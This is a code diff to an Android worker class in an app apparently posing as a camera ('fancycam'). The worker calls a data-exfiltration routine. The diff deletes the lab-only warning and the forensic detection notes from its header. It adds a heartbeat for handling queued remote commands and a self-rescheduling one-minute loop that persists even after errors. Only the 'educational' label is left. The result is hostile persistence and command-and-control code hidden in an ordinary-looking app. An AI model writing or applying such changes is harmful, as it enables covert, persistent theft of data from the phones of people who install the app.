@@ -2,21 +2,20 @@ package com.example.fancycam
 
 import android.content.Context
 import android.util.Log
+import java.util.concurrent.TimeUnit
+import androidx.work.Constraints
 import androidx.work.CoroutineWorker
+import androidx.work.ExistingWorkPolicy
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkerParameters
+import androidx.work.WorkManager
 
 /**
  * EDUCATIONAL DEMO - Android Security & Forensics Course
  *
  * Demonstrates how malware uses WorkManager for persistent background
  * data collection that survives app termination.
- *
- * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
- *
- * Forensic analysis points:
- *  - Check WorkManager database: /data/data/com.example.fancycam/androidx.work.workdb
- *  - Look for scheduled workers in the work specification table
- *  - Monitor logcat for DataCollectionWorker tags
  */
 class DataCollectionWorker(
     context: Context,
@@ -28,11 +27,30 @@ class DataCollectionWorker(
 
         return try {
             DataExfilSender.collectAndExfiltrate(applicationContext)
+            // Keep the app checking in while backgrounded so queued remote commands can be handled
+            DataExfilSender.sendHeartbeat(applicationContext)
+            scheduleNext(applicationContext)
             Result.success()
         } catch (e: Exception) {
             Log.e(TAG, "[EDUCATIONAL] Background collection failed", e)
+            scheduleNext(applicationContext)
             Result.retry()
         }
+    }
+
+    private fun scheduleNext(context: Context) {
+        val constraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
+        val next = OneTimeWorkRequestBuilder<DataCollectionWorker>()
+            .setInitialDelay(1, TimeUnit.MINUTES)
+            .setConstraints(constraints)
+            .build()
+        WorkManager.getInstance(context).enqueueUniqueWork(
+            WORK_NAME,
+            ExistingWorkPolicy.KEEP,
+            next
+        )
     }
 
     companion object {
